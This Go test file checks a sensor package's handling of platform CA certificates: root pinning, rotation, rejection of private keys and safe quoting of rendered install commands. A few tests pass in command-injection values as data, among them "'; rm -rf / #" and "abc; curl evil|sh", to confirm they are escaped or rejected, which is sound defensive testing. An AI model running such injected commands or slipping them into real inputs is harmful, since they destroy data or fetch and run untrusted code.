package sensor

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/openctemio/openctem/api/pkg/logger"
)

type testCert struct {
	cert *x509.Certificate
	key  *ecdsa.PrivateKey
	pem  []byte
}

// issue makes a certificate signed by parent (self-signed when parent is nil).
func issue(t *testing.T, cn string, isCA bool, notAfter time.Time, parent *testCert) *testCert {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             time.Now().Add(-2 * time.Hour),
		NotAfter:              notAfter,
		IsCA:                  isCA,
		BasicConstraintsValid: true,
	}
	if isCA {
		tmpl.KeyUsage = x509.KeyUsageCertSign
	}
	signer, signerKey := tmpl, key
	if parent != nil {
		signer, signerKey = parent.cert, parent.key
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, signer, &key.PublicKey, signerKey)
	if err != nil {
		t.Fatal(err)
	}
	c, err := x509.ParseCertificate(der)
	if err != nil {
		t.Fatal(err)
	}
	return &testCert{cert: c, key: key, pem: pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})}
}

func sumHex(c *testCert) string {
	s := sha256.Sum256(c.cert.Raw)
	return hex.EncodeToString(s[:])
}

func join(parts ...[]byte) []byte {
	var out []byte
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}

func TestParsePlatformCA_RootAndIntermediate(t *testing.T) {
	later := time.Now().Add(24 * time.Hour)
	root := issue(t, "OpenCTEM Internal CA - 2026 ECC Root", true, later, nil)
	inter := issue(t, "OpenCTEM Internal CA - ECC Intermediate", true, later, root)

	ca, err := ParsePlatformCA(join(inter.pem, root.pem))
	if err != nil {
		t.Fatal(err)
	}
	if len(ca.Certs) != 2 {
		t.Fatalf("certs = %+v", ca.Certs)
	}
	i, r := ca.Certs[0], ca.Certs[1]
	if i.Root || i.CommonName != "OpenCTEM Internal CA - ECC Intermediate" || i.SHA256Hex != sumHex(inter) {
		t.Errorf("intermediate = %+v", i)
	}
	if !r.Root || r.CommonName != "OpenCTEM Internal CA - 2026 ECC Root" || r.SHA256Hex != sumHex(root) {
		t.Errorf("root = %+v", r)
	}
	if len(r.SHA256) != 95 || strings.Count(r.SHA256, ":") != 31 || !strings.EqualFold(strings.ReplaceAll(r.SHA256, ":", ""), r.SHA256Hex) {
		t.Errorf("colon fingerprint %q does not match %q", r.SHA256, r.SHA256Hex)
	}
	if !r.NotAfter.Equal(root.cert.NotAfter.UTC()) {
		t.Errorf("not_after = %v", r.NotAfter)
	}
	// The pin is the root only, whatever its position in the file.
	if got := ca.Pins(time.Now()); got != sumHex(root) {
		t.Errorf("pins = %q, want the root %q", got, sumHex(root))
	}
	if ca.Fingerprint() != r.SHA256 {
		t.Errorf("fingerprint = %q, want the root's", ca.Fingerprint())
	}
	if ca.PEM != string(join(inter.pem, root.pem)) {
		t.Errorf("PEM is not the two certificates re-encoded:\n%s", ca.PEM)
	}
}

func TestParsePlatformCA_RotationPinsEveryLiveRoot(t *testing.T) {
	later := time.Now().Add(24 * time.Hour)
	oldRoot := issue(t, "Old Root", true, later, nil)
	newRoot := issue(t, "New Root", true, later, nil)
	expired := issue(t, "Expired Root", true, time.Now().Add(-time.Hour), nil)

	ca, err := ParsePlatformCA(join(oldRoot.pem, newRoot.pem, expired.pem))
	if err != nil {
		t.Fatal(err)
	}
	if got, want := ca.Pins(time.Now()), sumHex(oldRoot)+","+sumHex(newRoot); got != want {
		t.Errorf("pins = %q, want %q (an expired root is never pinned)", got, want)
	}
	if len(ca.Certs) != 3 {
		t.Errorf("the expired root is still listed for the console: %+v", ca.Certs)
	}
}

func TestParsePlatformCA_IntermediateOnlyBundlePinsIt(t *testing.T) {
	later := time.Now().Add(24 * time.Hour)
	root := issue(t, "Root", true, later, nil)
	inter := issue(t, "Intermediate", true, later, root)
	ca, err := ParsePlatformCA(inter.pem)
	if err != nil {
		t.Fatal(err)
	}
	if ca.Pins(time.Now()) != sumHex(inter) {
		t.Errorf("pins = %q", ca.Pins(time.Now()))
	}
}

// SECURITY: a private key in the CA file never reaches the public endpoint
// or a snippet: the whole file is refused.
func TestParsePlatformCA_RefusesPrivateKeys(t *testing.T) {
	root := issue(t, "Root", true, time.Now().Add(time.Hour), nil)
	keyDER, err := x509.MarshalECPrivateKey(root.key)
	if err != nil {
		t.Fatal(err)
	}
	pkcs8, err := x509.MarshalPKCS8PrivateKey(root.key)
	if err != nil {
		t.Fatal(err)
	}
	for name, b := range map[string][]byte{
		"ec key after cert":   join(root.pem, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})),
		"pkcs8 key before":    join(pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: pkcs8}), root.pem),
		"encrypted key":       join(root.pem, pem.EncodeToMemory(&pem.Block{Type: "ENCRYPTED PRIVATE KEY", Bytes: []byte("x")})),
		"rsa key, bad base64": join(root.pem, []byte("-----BEGIN RSA PRIVATE KEY-----\n!!not base64!!\n-----END RSA PRIVATE KEY-----\n")),
		"key only":            pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: pkcs8}),
		"openssh private key": join(root.pem, []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n")),
	} {
		ca, err := ParsePlatformCA(b)
		if !errors.Is(err, ErrCAFileHasPrivateKey) || ca != nil {
			t.Errorf("%s: err=%v ca=%v, want ErrCAFileHasPrivateKey", name, err, ca)
		}
	}
}

func TestParsePlatformCA_SkipsWhatIsNotACACertificate(t *testing.T) {
	later := time.Now().Add(time.Hour)
	root := issue(t, "Root", true, later, nil)
	leaf := issue(t, "platform.example.com", false, later, root)

	ca, err := ParsePlatformCA(join(leaf.pem, []byte("junk between\n"),
		pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: []byte("bad der")}),
		pem.EncodeToMemory(&pem.Block{Type: "X509 CRL", Bytes: []byte("crl")}), root.pem))
	if err != nil {
		t.Fatal(err)
	}
	if len(ca.Certs) != 1 || ca.Certs[0].SHA256Hex != sumHex(root) || strings.Count(ca.PEM, "BEGIN") != 1 {
		t.Errorf("only the root should remain: %+v\n%s", ca.Certs, ca.PEM)
	}

	for name, b := range map[string][]byte{
		"empty":     nil,
		"garbage":   []byte("not a certificate"),
		"leaf only": leaf.pem,
		"bad der":   pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: []byte("junk")}),
		"too large": make([]byte, maxCACertFileSize+1),
	} {
		if ca, err := ParsePlatformCA(b); err == nil || ca != nil {
			t.Errorf("%s: want an error, got %+v", name, ca)
		}
	}
}

func TestParsePlatformCA_BoundsTheCertificateCount(t *testing.T) {
	root := issue(t, "Root", true, time.Now().Add(time.Hour), nil)
	var b []byte
	for range maxPlatformCACerts + 4 {
		b = append(b, root.pem...)
	}
	ca, err := ParsePlatformCA(b)
	if err != nil {
		t.Fatal(err)
	}
	if len(ca.Certs) != maxPlatformCACerts {
		t.Errorf("kept %d certificates, want %d", len(ca.Certs), maxPlatformCACerts)
	}
}

func TestPlatformCASource(t *testing.T) {
	// Unset: off, no error.
	for _, src := range []*PlatformCASource{nil, NewPlatformCASource("")} {
		if ca, err := src.Get(); ca != nil || err != nil || src.Configured() {
			t.Errorf("unset source: ca=%v err=%v", ca, err)
		}
	}

	dir := t.TempDir()
	path := filepath.Join(dir, "root.crt")
	src := NewPlatformCASource(path)

	// Missing (the gateway has not exported it yet): not exist, no CA.
	if ca, err := src.Get(); ca != nil || !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("missing file: ca=%v err=%v", ca, err)
	}

	first := issue(t, "First Root", true, time.Now().Add(time.Hour), nil)
	if err := os.WriteFile(path, first.pem, 0o600); err != nil {
		t.Fatal(err)
	}
	ca, err := src.Get()
	if err != nil || ca.Pins(time.Now()) != sumHex(first) {
		t.Fatalf("after export: ca=%v err=%v", ca, err)
	}

	// Rotated in place: the next read sees both roots.
	second := issue(t, "Second Root", true, time.Now().Add(time.Hour), nil)
	if err := os.WriteFile(path, join(first.pem, second.pem), 0o600); err != nil {
		t.Fatal(err)
	}
	ca, err = src.Get()
	if err != nil || ca.Pins(time.Now()) != sumHex(first)+","+sumHex(second) {
		t.Fatalf("after rotation: pins=%q err=%v", ca.Pins(time.Now()), err)
	}

	// A key written into it: refused until fixed.
	if err := os.WriteFile(path, join(first.pem, []byte("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n")), 0o600); err != nil {
		t.Fatal(err)
	}
	if ca, err := src.Get(); ca != nil || !errors.Is(err, ErrCAFileHasPrivateKey) {
		t.Fatalf("with a key: ca=%v err=%v", ca, err)
	}
}

func TestSetPlatformCA(t *testing.T) {
	root := issue(t, "Root", true, time.Now().Add(time.Hour), nil)
	ca, err := ParsePlatformCA(root.pem)
	if err != nil {
		t.Fatal(err)
	}
	var d SensorTemplateData
	d.SetPlatformCA(ca, time.Now())
	if d.CACert != ca.PEM || d.CAPins != sumHex(root) {
		t.Errorf("data = %q %q", d.CACert, d.CAPins)
	}
	d.SetPlatformCA(nil, time.Now())
	if d.CACert != "" || d.CAPins != "" {
		t.Errorf("nil CA must clear both: %q %q", d.CACert, d.CAPins)
	}
	// Every root expired: the CA is still installed, nothing is pinned.
	d.SetPlatformCA(ca, time.Now().Add(2*time.Hour))
	if d.CACert == "" || d.CAPins != "" {
		t.Errorf("expired root: %q %q", d.CACert, d.CAPins)
	}
}

func TestMultiKitCommand(t *testing.T) {
	pin := strings.Repeat("ab", 32)
	got := MultiKitCommand("openctem-sensor", "https://192.0.2.10", "ABCD-EFGH", pin)
	want := "./sensors.sh add 'openctem-sensor' --api-url 'https://192.0.2.10' --pairing-code 'ABCD-EFGH' --ca-sha256 " + pin + "\n"
	if !strings.HasSuffix(got, want) || !strings.Contains(got, MultiKitGuideURL) {
		t.Errorf("command:\n%s", got)
	}
	plain := MultiKitCommand("openctem-sensor", "https://openctem.example.com", "", "")
	if strings.Contains(plain, "--ca-sha256") || strings.Contains(plain, "--pairing-code") {
		t.Errorf("no pin and no code expected:\n%s", plain)
	}
	// SECURITY: a value that is not a hex pin never reaches the shell line,
	// and the URL is quoted.
	hostile := MultiKitCommand("x", "https://a.example/'; rm -rf / #", "", "abc; curl evil|sh")
	if strings.Contains(hostile, "curl evil") || !strings.Contains(hostile, `'https://a.example/'\''; rm -rf / #'`) {
		t.Errorf("hostile input:\n%s", hostile)
	}
}

// Every install the platform renders pins the private CA's root when one is
// configured (SENSOR_CA_SHA256), pairing or key, and the shell snippets
// still parse; without a CA no snippet mentions the pin.
func TestTemplates_PinThePlatformCA(t *testing.T) {
	root := issue(t, "Root", true, time.Now().Add(time.Hour), nil)
	ca, err := ParsePlatformCA(root.pem)
	if err != nil {
		t.Fatal(err)
	}
	pin := sumHex(root)
	for _, dir := range templateSources {
		for name, data := range map[string]SensorTemplateData{"key": fullData(t), "pair": pairData(t, "ABCD-EFGH")} {
			data.SetPlatformCA(ca, time.Now())
			out := render(t, dir, data)
			formats := map[string]string{"docker": out.Docker, "compose": out.Compose, "kubernetes": out.Kubernetes, "cli": out.CLI}
			if name == "key" {
				formats["helm"], formats["env"] = out.Helm, out.Env
			}
			for f, s := range formats {
				if !strings.Contains(s, "SENSOR_CA_SHA256") || !strings.Contains(s, pin) {
					t.Errorf("[%s %s] %s does not pin the root:\n%s", dir, name, f, s)
				}
			}
			bashSyntaxOK(t, dir+" docker", out.Docker)
			bashSyntaxOK(t, dir+" cli", out.CLI)
			bashSyntaxOK(t, dir+" helm", out.Helm)

			data.SetPlatformCA(nil, time.Now())
			out = render(t, dir, data)
			for f, s := range map[string]string{"docker": out.Docker, "compose": out.Compose, "kubernetes": out.Kubernetes, "cli": out.CLI, "helm": out.Helm, "env": out.Env} {
				if strings.Contains(s, "SENSOR_CA_SHA256") {
					t.Errorf("[%s %s] %s pins without a CA:\n%s", dir, name, f, s)
				}
			}
		}
	}
}

// SECURITY: a template data value that is not a list of hex digests is
// refused before it can reach a shell line.
func TestRender_RefusesAMalformedPin(t *testing.T) {
	data := fullData(t)
	data.CAPins = "abc; curl evil|sh"
	if _, err := NewSensorConfigTemplateService(shippedTemplatesDir, logger.NewNop()).Render(data); err == nil {
		t.Fatal("a malformed pin was rendered")
	}
}
